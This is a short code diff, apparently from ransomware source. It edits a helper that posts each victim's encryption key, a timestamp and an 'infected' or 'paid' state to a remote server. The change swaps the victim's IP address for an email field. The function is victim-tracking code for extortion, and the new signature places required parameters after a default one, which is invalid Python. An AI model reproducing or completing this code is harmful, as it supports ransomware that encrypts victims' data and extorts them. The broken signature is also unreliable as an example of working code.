@@ -210,14 +210,14 @@ class Utils:
         'state': 'infected'/'paid'
     }
     """
-    def send_post_request(self, url=None, mode='insert', key=None, state='infected'):
+    def send_post_request(self, url, mode='insert', mail, key, state='infected'):
         try:
-            ipaddr = str(socket.gethostbyname(socket.gethostname()))
+            #ipaddr = str(socket.gethostbyname(socket.gethostname()))
             if mode=='insert': 
                 date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-                data = {'operation':mode, 'ip': ipaddr, 'key': str(key), 'date':date, 'state': state}
+                data = {'operation':mode, 'mail': mail, 'key': str(key), 'date':date, 'state': state}
             elif mode=='update':
-                data = {'operation':mode, 'ip': ipaddr, 'state': state}
+                data = {'operation':mode, 'mail': mail, 'state': state}
             requests.post(url, json=data)
         except:
             traceback.print_exc()
